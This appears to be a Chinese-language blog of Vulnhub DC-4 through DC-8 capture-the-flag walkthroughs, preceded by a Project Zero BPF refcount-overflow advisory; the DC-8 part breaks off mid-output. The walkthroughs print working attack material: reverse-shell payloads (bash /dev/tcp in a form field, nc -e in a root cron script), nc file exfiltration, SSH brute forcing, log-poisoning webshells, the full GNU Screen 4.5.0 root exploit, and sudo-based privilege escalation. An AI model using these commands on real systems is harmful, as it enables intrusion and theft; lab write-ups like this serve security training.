https://bugs.chromium.org/p/project-zero/issues/detail?id=809 Most things in the kernel use 32-bit reference counters, relying on the fact that the memory constraints of real computers make it impossible to create enough references to overflow the counters. There are exceptions for things like `struct file` because it is possible to create references to them with relatively little memory usage. Using BPF_MAP_TYPE_PROG_ARRAY maps, it is possible to create references to BPF programs that only need sizeof(void*) bytes each (8 bytes on amd64), permitting an overflow after filling ~32GB of memory that is subject to RLIMIT_MEMLOCK restrictions. The requirement for more than 32GB of RAM is relatively high, but not impossible. The requirement that the allocations need to be below RLIMIT_MEMLOCK is probably the bigger obstacle for exploitation: On most Linux systems, every user is only permitted to allocate up to 64KiB of RAM. However: - There are systems where RLIMIT_MEMLOCK is disabled administratively. - On systems with containers (e.g. LXC containers), usually every container\u0026#39;s root user has access to 2^16 different UIDs. If an attacker has control over 9 containers and can share file descriptors between them or has control over one container with a relatively high number of mapped UIDs, he should be able to trigger the overflow. The attached PoC, when run in a Ubuntu 16.04 VM with 40GB RAM and the RLIMIT_MEMLOCK limit disabled, needs 25 minutes to execute and causes the following oops: [ 1850.676543] BUG: unable to handle kernel paging request at ffffc900069c5010 [ 1850.676550] IP: [\u0026lt;ffffffff81173525\u0026gt;] bpf_prog_put_rcu+0x5/0x30 [ 1850.676556] PGD 9bc094067 PUD 9bc095067 PMD 9b4d2b067 PTE 0 [ 1850.676558] Oops: 0000 [#1] SMP [ 1850.676561] Modules linked in: nls_utf8 isofs vboxsf(OE) snd_intel8x0 snd_ac97_codec ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event joydev snd_rawmidi snd_seq snd_seq_device snd_timer input_leds snd serio_raw soundcore vboxvideo(OE) 8250_fintek drm i2c_piix4 vboxguest(OE) mac_hid parport_pc ppdev lp parport autofs4 hid_generic usbhid hid psmouse ahci libahci fjes video e1000 pata_acpi [ 1850.676579] CPU: 0 PID: 1861 Comm: overflow Tainted: G OE 4.4.0-21-generic #37-Ubuntu [ 1850.676581] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006 [ 1850.676582] task: ffff8809b2fe4b00 ti: ffff8809b2f3c000 task.ti: ffff8809b2f3c000 [ 1850.676583] RIP: 0010:[\u0026lt;ffffffff81173525\u0026gt;] [\u0026lt;ffffffff81173525\u0026gt;] bpf_prog_put_rcu+0x5/0x30 [ 1850.676585] RSP: 0018:ffff8809b2f3fdb8 EFLAGS: 00010286 [ 1850.676586] RAX: ffffffff81a24f20 RBX: 0000000000000000 RCX: 0000000000000001 [ 1850.676587] RDX: ffff880230ebc110 RSI: ffff880230ebc100 RDI: ffffc900069c5000 [ 1850.676588] RBP: ffff8809b2f3fdc0 R08: 0000000000000000 R09: 0000000000000000 [ 1850.676589] R10: ffff8809b55468e0 R11: ffff880230ebc110 R12: ffffc90814ce6060 [ 1850.676590] R13: ffffc90814ce6000 R14: ffff8809b5a9d1a0 R15: ffff8809b29cf480 [ 1850.676592] FS: 00007fbe54cf5700(0000) GS:ffff8809e3c00000(0000) knlGS:0000000000000000 [ 1850.676593] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b [ 1850.676594] CR2: ffffc900069c5010 CR3: 00000009ae9ce000 CR4: 00000000000006f0 [ 1850.676598] Stack: [ 1850.676599] ffffffff8117810e ffff8809b2f3fde8 ffffffff811783c6 ffffc90814ce6000 [ 1850.676600] 0000000000000008 ffff8809b55468e0 ffff8809b2f3fdf8 ffffffff811729bd [ 1850.676602] ffff8809b2f3fe10 ffffffff811733b9 ffff880230ebc100 ffff8809b2f3fe58 [ 1850.676603] Call Trace: [ 1850.676607] [\u0026lt;ffffffff8117810e\u0026gt;] ? prog_fd_array_put_ptr+0xe/0x10 [ 1850.676609] [\u0026lt;ffffffff811783c6\u0026gt;] bpf_fd_array_map_clear+0x36/0x50 [ 1850.676611] [\u0026lt;ffffffff811729bd\u0026gt;] bpf_map_put_uref+0x1d/0x20 [ 1850.676612] [\u0026lt;ffffffff811733b9\u0026gt;] bpf_map_release+0x19/0x30 [ 1850.676616] [\u0026lt;ffffffff8120e514\u0026gt;] __fput+0xe4/0x220 [ 1850.676617] [\u0026lt;ffffffff8120e68e\u0026gt;] ____fput+0xe/0x10 [ 1850.676621] [\u0026lt;ffffffff8109e943\u0026gt;] task_work_run+0x73/0x90 [ 1850.676625] [\u0026lt;ffffffff81083ba4\u0026gt;] do_exit+0x2e4/0xae0 [ 1850.676626] [\u0026lt;ffffffff81084423\u0026gt;] do_group_exit+0x43/0xb0 [ 1850.676628] [\u0026lt;ffffffff810844a4\u0026gt;] SyS_exit_group+0x14/0x20 [ 1850.676632] [\u0026lt;ffffffff818244f2\u0026gt;] entry_SYSCALL_64_fastpath+0x16/0x71 [ 1850.676633] Code: cf 00 55 48 89 e5 48 89 78 08 48 89 07 48 c7 47 08 60 55 e6 81 48 89 3d 4a 20 cf 00 5d c3 0f 1f 84 00 00 00 00 00 66 66 66 66 90 \u0026lt;48\u0026gt; 8b 47 10 3e ff 08 74 01 c3 55 48 8b 7f 10 48 c7 c6 20 2f 17 [ 1850.676649] RIP [\u0026lt;ffffffff81173525\u0026gt;] bpf_prog_put_rcu+0x5/0x30 [ 1850.676650] RSP \u0026lt;ffff8809b2f3fdb8\u0026gt; [ 1850.676651] CR2: ffffc900069c5010 [ 1850.676653] ---[ end trace 90333448b9273067 ]--- [ 1850.676655] Fixing recursive fault but reboot is needed! I believe that this issue illustrates that reference count hardening makes sense, even without reference leaks. A suggested patch (compile-tested) is attached. Fixed in https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id=92117d8443bc5afacc8d5ba82e541946310f106e Proof of Concept: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39773.zip 蚁剑终端里不知道为什么无法提权，反弹shell后实现提权：\n$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip\r$ unzip 39772.zip\r$ cd 39772\r$ tar -xvf refcount_overflow.tar\r$ cd ebpf_mapfd_doubleput_exploit the-flag.txt：\ncat /root/the-flag.txt\r__ __ _ _ ____ _ _ _ _ \\ \\ / /__| | | | _ \\ ___ _ __ ___| | | | |\r\\ \\ /\\ / / _ \\ | | | | | |/ _ \\| \u0026#39;_ \\ / _ \\ | | | |\r\\ V V / __/ | | | |_| | (_) | | | | __/_|_|_|_|\r\\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_)\rCongratulations are in order. :-)\rI hope you\u0026#39;ve enjoyed this challenge as I enjoyed making it.\rIf there are any ways that I can improve these little challenges,\rplease let me know.\rAs per usual, comments and complaints can be sent via Twitter to @DCAU7\rHave a great day!!!! vulnhub DC4 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.133 Host is up (0.00052s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 22端口开启了ssh服务，80端口开启了http服务，先访问http服务：\nkali没安装FoxyProxy插件，用NAT模式配置端口映射使主机访问：编辑-\u0026gt;虚拟网络编辑器-\u0026gt;NAT设置-\u0026gt;添加-\u0026gt;设置主机端口以及要访问的虚拟机Web服务ip端口，Intruder爆破出密码为happy\nradio参数可控，可以实现RCE，kali监听2333端口，尝试反弹shell：\nradio=bash+-c+\u0026#39;bash+-i+\u0026gt;%26+/dev/tcp/61.139.2.128/2333+0\u0026gt;%261\u0026#39;\u0026amp;submit=Run 反弹shell成功，当前用户为www-data：\n$ nc -lvnp 2333 listening on [any] 2333 ... connect to [61.139.2.128] from (UNKNOWN) [61.139.2.133] 54614 bash: cannot set terminal process group (459): Inappropriate ioctl for device bash: no job control in this shell www-data@dc-4:/usr/share/nginx/html$ 先获取敏感文件信息，比如/etc/passwd，该文件只有root可写：\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:109::/var/run/dbus:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash Debian-exim:x:108:112::/var/spool/exim4:/bin/false /home目录下有三个用户charles, jim, sam，在/home/jim/backups目录下发现备份文件old-passwords.bak，可能是ssh用户密码，先用nc将密码字典传到kali上：\nkali:$ nc -lvnp 2444 \u0026gt; passwords.txt target:$ nc 61.139.2.128 2444 \u0026lt; /home/jim/backups/old-passwords.bak 再写一个username.txt：\njim\rsam\rcharles 爆破ssh用户名和密码：\n$ hydra -L username.txt -P passwords.txt ssh://61.139.2.133 -vV ... [22][ssh] host: 61.139.2.133 login: jim password: jibril04 ... 用ssh登录jim用户：\nssh jim@61.139.2.133 -p 22 查看mbox文件内容：\nFrom root@dc-4 Sat Apr 06 20:20:04 2019 Return-path: \u0026lt;root@dc-4\u0026gt; Envelope-to: jim@dc-4 Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000 Received: from root by dc-4 with local (Exim 4.89) (envelope-from \u0026lt;root@dc-4\u0026gt;) id 1hCiQe-0000gc-EC for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000 To: jim@dc-4 Subject: Test MIME-Version: 1.0 Content-Type: text/plain; charset=\u0026#34;UTF-8\u0026#34; Content-Transfer-Encoding: 8bit Message-Id: \u0026lt;E1hCiQe-0000gc-EC@dc-4\u0026gt; From: root \u0026lt;root@dc-4\u0026gt; Date: Sat, 06 Apr 2019 20:20:04 +1000 Status: RO This is a test. 看起来像一封mail，查看/var/mail目录，发现存在jim文件：\nFrom charles@dc-4 Sat Apr 06 21:15:46 2019 Return-path: \u0026lt;charles@dc-4\u0026gt; Envelope-to: jim@dc-4 Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000 Received: from charles by dc-4 with local (Exim 4.89) (envelope-from \u0026lt;charles@dc-4\u0026gt;) id 1hCjIX-0000kO-Qt for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000 To: jim@dc-4 Subject: Holidays MIME-Version: 1.0 Content-Type: text/plain; charset=\u0026#34;UTF-8\u0026#34; Content-Transfer-Encoding: 8bit Message-Id: \u0026lt;E1hCjIX-0000kO-Qt@dc-4\u0026gt; From: Charles \u0026lt;charles@dc-4\u0026gt; Date: Sat, 06 Apr 2019 21:15:45 +1000 Status: O Hi Jim, I\u0026#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong. Password is: ^xHhA\u0026amp;hvim0y See ya, Charles 获得了Charles的ssh密码，查看是否存在可用的sudo命令：\n$ sudo -l Matching Defaults entries for charles on dc-4: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User charles may run the following commands on dc-4: (root) NOPASSWD: /usr/bin/teehee charles@dc-4:~$ ls /usr/bin/teehee -al -rwxr-xr-x 1 root root 38740 Apr 6 2019 /usr/bin/teehee teehee提权，往/etc/passwd写入一个uid为0的无密码的用户：\n$ echo \u0026#34;test::0:0:::/bin/bash\u0026#34; | sudo teehee -a /etc/passwd test::0:0:::/bin/bash $ su test root@dc-4:/home/charles# 最后查看/root目录下文件，获取/root/flag.txt文件内容：\n888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 \u0026#34;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88\u0026#34;\u0026#34;88b 888 \u0026#34;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. \u0026#34; \u0026#34; \u0026#34; \u0026#34; 888P Y888 \u0026#34;Y8888 888 888 8888888P\u0026#34; \u0026#34;Y88P\u0026#34; 888 888 \u0026#34;Y8888 888 888 888 888 Congratulations!!!\rHope you enjoyed DC-4. Just wanted to send a big thanks out there to all those\rwho have provided feedback, and who have taken time to complete these little\rchallenges.\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.cnblogs.com/zlgxzswjy/p/16118468.html\nhttps://developer.aliyun.com/article/1489918\nvulnhub DC5 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.140 Host is up (0.00044s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 111/tcp open rpcbind 访问web服务：\n利用dirsearch扫出目录：\n[16:48:41] 200 - 4KB - /contact.php [16:48:41] 301 - 184B - /css -\u0026gt; http://61.139.2.140/css/ [16:48:43] 200 - 6KB - /faq.php [16:48:44] 200 - 17B - /footer.php [16:48:45] 403 - 570B - /images/ [16:48:45] 301 - 184B - /images -\u0026gt; http://61.139.2.140/images/ [16:48:55] 200 - 852B - /thankyou.php 访问/footer.php返回copyright，访问/thankyou.php，发现同样存在copyright部分，可能存在文件包含，\n/thankyou.php?file=/var/log/nginx/access.log\r[08/Oct/2025:02:58:36 +1000] \u0026#34;GET /thankyou.php?file=/etc/passwd HTTP/1.1\u0026#34; 200 986 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\u0026#34; 日志会记录UA头，注入一句话木马，蚁剑连接，先找suid权限文件：\n(www-data:/) $ find / -perm -u=s -type f 2\u0026gt;/dev/null /bin/su /bin/mount /bin/umount /bin/screen-4.5.0 /usr/bin/gpasswd /usr/bin/procmail /usr/bin/at /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/sbin/exim4 /sbin/mount.nfs 利用searchsploit查找可用漏洞：\n$ searchsploit screen 4.5.0 ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- GNU Screen 4.5.0 - Local Privilege Escalation | linux/local/41154.sh GNU Screen 4.5.0 - Local Privilege Escalation (PoC) | linux/local/41152.txt ------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 查看该脚本内容：\n#!/bin/bash # screenroot.sh # setuid screen v4.5.0 local root exploit # abuses ld.so.preload overwriting to get root. # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html # HACK THE PLANET # ~ infodox (25/1/2017) echo \u0026#34;~ gnu/screenroot ~\u0026#34; echo \u0026#34;[+] First, we create our shell and library...\u0026#34; cat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/libhax.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(\u0026#34;/tmp/rootshell\u0026#34;, 0, 0); chmod(\u0026#34;/tmp/rootshell\u0026#34;, 04755); unlink(\u0026#34;/etc/ld.so.preload\u0026#34;); printf(\u0026#34;[+] done!\\n\u0026#34;); } EOF gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c rm -f /tmp/libhax.c cat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/rootshell.c #include \u0026lt;stdio.h\u0026gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); } EOF gcc -o /tmp/rootshell /tmp/rootshell.c rm -f /tmp/rootshell.c echo \u0026#34;[+] Now we create our /etc/ld.so.preload file...\u0026#34; cd /etc umask 000 # because screen -D -m -L ld.so.preload echo -ne \u0026#34;\\x0a/tmp/libhax.so\u0026#34; # newline needed echo \u0026#34;[+] Triggering...\u0026#34; screen -ls # screen itself is setuid, so... /tmp/rootshell 上传到靶机执行即可提权，/root/thisistheflag.txt：\n888b 888 d8b 888 888 888 888 8888b 888 Y8P 888 888 888 888 88888b 888 888 888 888 888 888Y88b 888 888 .d8888b .d88b. 888 888 888 .d88b. 888d888 888 888 888 888 888 888 Y88b888 888 d88P\u0026#34; d8P Y8b 888 888 888 d88\u0026#34;\u0026#34;88b 888P\u0026#34; 888 .88P 888 888 888 888 Y88888 888 888 88888888 888 888 888 888 888 888 888888K Y8P Y8P Y8P 888 Y8888 888 Y88b. Y8b. Y88b 888 d88P Y88..88P 888 888 \u0026#34;88b \u0026#34; \u0026#34; \u0026#34; 888 Y888 888 \u0026#34;Y8888P \u0026#34;Y8888 \u0026#34;Y8888888P\u0026#34; \u0026#34;Y88P\u0026#34; 888 888 888 888 888 888 Once again, a big thanks to all those who do these little challenges,\rand especially all those who give me feedback - again, it\u0026#39;s all greatly\rappreciated. :-)\rI also want to send a big thanks to all those who find the vulnerabilities\rand create the exploits that make these challenges possible. vulnhub DC6 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24\rNmap scan report for 61.139.2.141\rHost is up (0.00024s latency).\rNot shown: 998 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http 配置hosts文件：\n61.139.2.141 wordy 枚举用户：\n$ wpscan --url http://wordy -e u [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] graham | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] mark | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] sarah | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] jens | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 爆破密码得到mark/helpdesk01，插件存在漏洞cve-2018-15877，反弹shell：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/bin/chfn /usr/bin/sudo /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chsh /usr/bin/passwd /bin/su /bin/mount /bin/umount /bin/ping /home/mark/stuff/things-to-do.txt：\nThings to do:\r- Restore full functionality for the hyperdrive (need to speak to Jens)\r- Buy present for Sarah\u0026#39;s farewell party\r- Add new user: graham - GSo7isUM1D4 - done\r- Apply for the OSCP course\r- Buy new laptop for Sarah\u0026#39;s replacement 生成伪终端用于执行su：\npython -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; 登录graham用户，sudo -l查看可执行命令：\ngraham@dc-6:/var/www/html/wp-admin$ sudo -l sudo -l Matching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh graham@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh cat /home/jens/backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html 继续反弹shell获取jens用户权限，向/home/jens/backups.sh写入反弹shell脚本：\ngraham@dc-6:/var/www/html/wp-admin$ sudo -u jens /home/jens/backups.sh nmap提权：\njens@dc-6:/var/www/html/wp-admin$ sudo -l sudo -l Matching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap jens@dc-6:/var/www/html/wp-admin$ echo \u0026#34;os.execute(\u0026#39;/bin/sh\u0026#39;)\u0026#34; \u0026gt; /tmp/shell.nse jens@dc-6:/var/www/html/wp-admin$ sudo nmap --script=/tmp/shell.nse /root/theflag.txt：\nYb dP 888888 88 88 8888b. dP\u0026#34;Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88\u0026#34;\u0026#34; 88 .o 88 .o 8I dY Yb dP 88 Y88 88\u0026#34;\u0026#34; `\u0026#34;\u0026#39; YP YP 888888 88ood8 88ood8 8888Y\u0026#34; YbodP 88 Y8 888888 (8) Congratulations!!!\rHope you enjoyed DC-6. Just wanted to send a big thanks out there to all those\rwho have provided feedback, and who have taken time to complete these little\rchallenges.\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.cnblogs.com/cuerz/p/15576711.html\nhttps://cloud.tencent.com/developer/article/1717979\nvulnhub DC7 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.137 Host is up (0.00048s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 访问web服务：\nhttps://github.com/Dc7User中有网站源码，config.php：\n\u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;dc7user\u0026#34;; $password = \u0026#34;MdR3xOgB7#dW\u0026#34;; $dbname = \u0026#34;Staff\u0026#34;; $conn = mysqli_connect($servername, $username, $password, $dbname); ?\u0026gt; 网站登录失败，尝试ssh登录成功，dc7user目录下存在mbox文件，渗透时收到一封邮件：\nYou have new mail in /var/mail/dc7user /var/mail/dc7user其中一封邮件：\nFrom root@dc-7 Sun Sep 28 12:45:04 2025\rReturn-path: \u0026lt;root@dc-7\u0026gt;\rEnvelope-to: root@dc-7\rDelivery-date: Sun, 28 Sep 2025 12:45:04 +1000\rReceived: from root by dc-7 with local (Exim 4.89)\r(envelope-from \u0026lt;root@dc-7\u0026gt;)\rid 1v2hPM-0000N4-Ms\rfor root@dc-7; Sun, 28 Sep 2025 12:45:04 +1000\rFrom: root@dc-7 (Cron Daemon)\rTo: root@dc-7\rSubject: Cron \u0026lt;root@dc-7\u0026gt; /opt/scripts/backups.sh\rMIME-Version: 1.0\rContent-Type: text/plain; charset=UTF-8\rContent-Transfer-Encoding: 8bit\rX-Cron-Env: \u0026lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin\u0026gt;\rX-Cron-Env: \u0026lt;SHELL=/bin/sh\u0026gt;\rX-Cron-Env: \u0026lt;HOME=/root\u0026gt;\rX-Cron-Env: \u0026lt;LOGNAME=root\u0026gt;\rMessage-Id: \u0026lt;E1v2hPM-0000N4-Ms@dc-7\u0026gt;\rDate: Sun, 28 Sep 2025 12:45:04 +1000\rDatabase dump saved to /home/dc7user/backups/website.sql [success] 每封邮件内容一致，每15分钟有一封，也就是说存在每15分钟执行一次的定时任务：\nSubject: Cron \u0026lt;root@dc-7\u0026gt; /opt/scripts/backups.sh 查看sh脚本权限：\n$ ls /opt/scripts/backups.sh -l\r-rwxrwxr-x 1 root www-data 520 Aug 29 2019 /opt/scripts/backups.sh /opt/scripts/backups.sh：\n#!/bin/bash\rrm /home/dc7user/backups/*\rcd /var/www/html/\rdrush sql-dump --result-file=/home/dc7user/backups/website.sql\rcd ..\rtar -czf /home/dc7user/backups/website.tar.gz html/\rgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql\rgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz\rchown dc7user:dc7user /home/dc7user/backups/*\rrm /home/dc7user/backups/website.sql\rrm /home/dc7user/backups/website.tar.gz 接下来就是获取www-data的权限，先查看drush的权限：\n$ ls /usr/local/bin/drush -l\r-rwxr-xr-x 1 root root 4789623 Jul 10 2019 /usr/local/bin/drush Drush可以用于直接从云服务器命令行管理 Drupal：\n$ drush status\rDrupal version : 8.7.6 Site URI : http://default Database driver : mysql Database hostname : localhost Database port : Database username : db7user Database name : d7db Database : Connected Drupal bootstrap : Successful Drupal user : Default theme : bartik Administration theme : seven PHP configuration : /etc/php/7.0/cli/php.ini PHP OS : Linux Drush script : /usr/local/bin/drush Drush version : 8.3.0 Drush temp directory : /tmp Drush configuration : Drush alias files : Install profile : standard Drupal root : /var/www/html Drupal Settings File : sites/default/settings.php Site path : sites/default File directory path : sites/default/files Temporary file directory path : /tmp Sync config path : sites/default/files/config_yQDLLJdPf9UT4DSAB5Wfl6XeoBn0AqtLqUYyVc4KUWQW-3USMUdXWY0UZmZ3Az5mT_DMS955DQ/sync 尝试修改admin密码：\n$ drush user-password admin --password=\u0026#34;12345\u0026#34;\rCommand user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command. [error]\rThe drush command \u0026#39;user-password admin\u0026#39; could not be executed.\r$ cd /var/www/html\r$ drush user-password admin --password=\u0026#34;12345\u0026#34;\rChanged password for admin Drush8中存在可以解析php内容的插件：https://www.drupal.org/project/php，添加对应插件并使用：\n写入一句话木马：\n蚁剑连上终端就是www-data用户，修改/opt/scripts/backups.sh文件实现反弹shell，等待定时任务执行实现提取：\n$ echo \u0026#39;nc 61.139.2.128 2333 -e /bin/bash\u0026#39; \u0026gt; /opt/scripts/backups.sh 拿到root权限后先看一下定时任务：\ncrontab -l # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use \u0026#39;*\u0026#39; in these fields (for \u0026#39;any\u0026#39;).# # Notice that tasks will be started based on the cron\u0026#39;s system # daemon\u0026#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command */15 * * * * /opt/scripts/backups.sh theflag.txt：\n888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 \u0026#34;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88\u0026#34;\u0026#34;88b 888 \u0026#34;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. \u0026#34; \u0026#34; \u0026#34; \u0026#34; 888P Y888 \u0026#34;Y8888 888 888 8888888P\u0026#34; \u0026#34;Y88P\u0026#34; 888 888 \u0026#34;Y8888 888 888 888 888 Congratulations!!!\rHope you enjoyed DC-7. Just wanted to send a big thanks out there to all those\rwho have provided feedback, and all those who have taken the time to complete these little\rchallenges.\rI\u0026#39;m sending out an especially big thanks to:\r@4nqr34z\r@D4mianWayne\r@0xmzfr\r@theart42\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.drupal.org/project/php\nhttps://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz\nvulnhub DC8 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.138 Host is up (0.00091s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 访问web服务：\n存在sql注入，注入点为nid，使用sqlmap：\n$ sqlmap -u http://61.139.2.138/?nid=1 GET parameter \u0026#39;nid\u0026#39; is vulnerable. $ sqlmap -u http://61.139.2.138/?nid=1 --current-db [14:07:43] [INFO] fetching current database current database: \u0026#39;d7db\u0026#39; $ sqlmap -u http://61.139.2.138/?nid=1 -D d7db --tables Database: d7db [88 tables] +-----------------------------+ | block | | cache | | filter | | history | | role | | system | | actions | | authmap | | batch | | block_custom | | block_node_type | | block_role | | blocked_ips | | cache_block | | cache_bootstrap | | cache_field | | cache_filter | | cache_form | | cache_image | | 